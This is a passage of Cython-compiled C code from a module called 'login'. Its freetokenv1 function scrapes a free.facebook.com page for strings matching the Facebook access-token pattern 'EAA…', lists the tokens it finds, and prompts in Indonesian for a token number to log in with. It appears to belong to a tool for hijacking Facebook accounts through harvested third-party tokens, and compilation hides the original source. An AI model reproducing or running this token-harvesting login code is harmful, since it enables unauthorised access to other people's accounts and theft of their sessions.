          __Pyx_XGIVEREF(__pyx_t_19);
          __Pyx_ErrRestore(__pyx_t_17, __pyx_t_18, __pyx_t_19);
          __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0; __pyx_t_21 = 0; __pyx_t_22 = 0;
          __pyx_lineno = __pyx_t_8; __pyx_clineno = __pyx_t_15; __pyx_filename = __pyx_t_16;
          goto __pyx_L5_except_error;
        }
        __pyx_L15:;
      }
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_AddTraceback("login.get_cookie", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_find_token);
  __Pyx_XDECREF(__pyx_v_nama);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_13freetokenv1(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); 
static PyMethodDef __pyx_mdef_5login_13freetokenv1 = {"freetokenv1", (PyCFunction)__pyx_pw_5login_13freetokenv1, METH_NOARGS, 0};
static PyObject *__pyx_pw_5login_13freetokenv1(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("freetokenv1 (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_12freetokenv1(__pyx_self);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_12freetokenv1(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_num = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v_pil = NULL;
  PyObject *__pyx_v_tolkau = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  int __pyx_t_13;
  int __pyx_t_14;
  int __pyx_t_15;
  PyObject *__pyx_t_16 = NULL;
  Py_UCS4 __pyx_t_17;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  char const *__pyx_t_20;
  PyObject *__pyx_t_21 = NULL;
  PyObject *__pyx_t_22 = NULL;
  PyObject *__pyx_t_23 = NULL;
  PyObject *__pyx_t_24 = NULL;
  PyObject *__pyx_t_25 = NULL;
  PyObject *__pyx_t_26 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("freetokenv1", 0);

  
  __Pyx_INCREF(__pyx_int_0);
  __pyx_v_num = __pyx_int_0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_parser); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ses); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_kp_u_https_free_facebook_com_10004070) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u_https_free_facebook_com_10004070);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  __pyx_t_6 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_6 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_t_5, __pyx_kp_u_html_parser};
    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 172, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_t_5, __pyx_kp_u_html_parser};
    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 172, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  } else
  #endif
  {
    __pyx_t_4 = PyTuple_New(2+__pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 172, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (__pyx_t_3) {
      __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_3); __pyx_t_3 = NULL;
    }
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_4, 0+__pyx_t_6, __pyx_t_5);
    __Pyx_INCREF(__pyx_kp_u_html_parser);
    __Pyx_GIVEREF(__pyx_kp_u_html_parser);
    PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_6, __pyx_kp_u_html_parser);
    __pyx_t_5 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_4, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 172, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_url = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_re); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_findall); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_v_url); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = NULL;
  __pyx_t_6 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
      __pyx_t_6 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_4)) {
    PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_kp_u_EAA_w, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 173, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
    PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_kp_u_EAA_w, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_6, 2+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 173, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  } else
  #endif
  {
    __pyx_t_3 = PyTuple_New(2+__pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 173, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (__pyx_t_5) {
      __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_5); __pyx_t_5 = NULL;
    }
    __Pyx_INCREF(__pyx_kp_u_EAA_w);
    __Pyx_GIVEREF(__pyx_kp_u_EAA_w);
    PyTuple_SET_ITEM(__pyx_t_3, 0+__pyx_t_6, __pyx_kp_u_EAA_w);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_3, 1+__pyx_t_6, __pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_3, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 173, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_data = __pyx_t_1;
  __pyx_t_1 = 0;

  
  if (likely(PyList_CheckExact(__pyx_v_data)) || PyTuple_CheckExact(__pyx_v_data)) {
    __pyx_t_1 = __pyx_v_data; __Pyx_INCREF(__pyx_t_1); __pyx_t_7 = 0;
    __pyx_t_8 = NULL;
  } else {
    __pyx_t_7 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_data); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 174, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_8 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 174, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_8)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 174, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 174, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 174, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 174, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_8(__pyx_t_1);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 174, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XDECREF_SET(__pyx_v_token, __pyx_t_4);
    __pyx_t_4 = 0;

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_10, &__pyx_t_11);
      __Pyx_XGOTREF(__pyx_t_9);
      __Pyx_XGOTREF(__pyx_t_10);
      __Pyx_XGOTREF(__pyx_t_11);
       {

        
        __pyx_t_12 = PyObject_Length(__pyx_v_token); if (unlikely(__pyx_t_12 == ((Py_ssize_t)-1))) __PYX_ERR(0, 176, __pyx_L5_error)
        __pyx_t_13 = ((__pyx_t_12 >= 35) != 0);
        if (__pyx_t_13) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_freetoken); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 177, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_13 = (__Pyx_PySequence_ContainsTF(__pyx_v_token, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 177, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_14 = (__pyx_t_13 != 0);
          if (__pyx_t_14) {
            goto __pyx_L14;
          }

          
           {
            __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_v_num, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 179, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF_SET(__pyx_v_num, __pyx_t_4);
            __pyx_t_4 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_freetoken); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 180, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_15 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_v_token); if (unlikely(__pyx_t_15 == ((int)-1))) __PYX_ERR(0, 180, __pyx_L5_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_prints); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 181, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Panel); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 181, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_16 = PyTuple_New(4); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 181, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_12 = 0;
            __pyx_t_17 = 127;
            __Pyx_INCREF(__pyx_kp_u_bold_white);
            __pyx_t_12 += 13;
            __Pyx_GIVEREF(__pyx_kp_u_bold_white);
            PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_kp_u_bold_white);
            __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_num, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 181, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_17 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_17) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_17;
            __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
            __Pyx_GIVEREF(__pyx_t_18);
            PyTuple_SET_ITEM(__pyx_t_16, 1, __pyx_t_18);
            __pyx_t_18 = 0;
            __Pyx_INCREF(__pyx_kp_u_bold_green);
            __pyx_t_12 += 15;
            __Pyx_GIVEREF(__pyx_kp_u_bold_green);
            PyTuple_SET_ITEM(__pyx_t_16, 2, __pyx_kp_u_bold_green);
            __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 181, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_17 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_17) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_17;
            __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
            __Pyx_GIVEREF(__pyx_t_18);
            PyTuple_SET_ITEM(__pyx_t_16, 3, __pyx_t_18);
            __pyx_t_18 = 0;
            __pyx_t_18 = __Pyx_PyUnicode_Join(__pyx_t_16, 4, __pyx_t_12, __pyx_t_17); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 181, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __pyx_t_16 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
              __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_5);
              if (likely(__pyx_t_16)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_16);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
              }
            }
            __pyx_t_2 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_16, __pyx_t_18) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_18);
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 181, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
              }
            }
            __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_5, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 181, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_L14:;

          
        }

        
      }
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      goto __pyx_L12_try_end;
      __pyx_L5_error:;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;

      
       {
        __Pyx_AddTraceback("login.freetokenv1", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_3, &__pyx_t_2) < 0) __PYX_ERR(0, 182, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GOTREF(__pyx_t_2);
        goto __pyx_L16_except_continue;
        __pyx_L16_except_continue:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        goto __pyx_L11_try_continue;
      }
      __pyx_L7_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_XGIVEREF(__pyx_t_11);
      __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
      goto __pyx_L1_error;
      __pyx_L11_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_XGIVEREF(__pyx_t_11);
      __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
      goto __pyx_L3_continue;
      __pyx_L12_try_end:;
    }

    
    __pyx_L3_continue:;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 183, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = 0;
  __pyx_t_17 = 127;
  __Pyx_INCREF(__pyx_kp_u__4);
  __pyx_t_7 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__4);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__4);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_P); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 183, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 183, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_17 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_17) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_17;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_Pilih_Nomer_Token_Untuk_Login);
  __pyx_t_7 += 36;
  __Pyx_GIVEREF(__pyx_kp_u_Pilih_Nomer_Token_Untuk_Login);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_Pilih_Nomer_Token_Untuk_Login);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_7, __pyx_t_17); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 183, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 183, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_pil = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_INCREF(__pyx_v_pil);
  __pyx_t_1 = __pyx_v_pil;
  __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u__16, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 184, __pyx_L1_error)
  if (!__pyx_t_13) {
  } else {
    __pyx_t_14 = __pyx_t_13;
    goto __pyx_L18_bool_binop_done;
  }
  __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 184, __pyx_L1_error)
  __pyx_t_14 = __pyx_t_13;
  __pyx_L18_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_13 = (__pyx_t_14 != 0);
  if (__pyx_t_13) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_login); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 185, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 185, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_10, &__pyx_t_9);
    __Pyx_XGOTREF(__pyx_t_11);
    __Pyx_XGOTREF(__pyx_t_10);
    __Pyx_XGOTREF(__pyx_t_9);
     {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_freetoken); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 187, __pyx_L20_error)
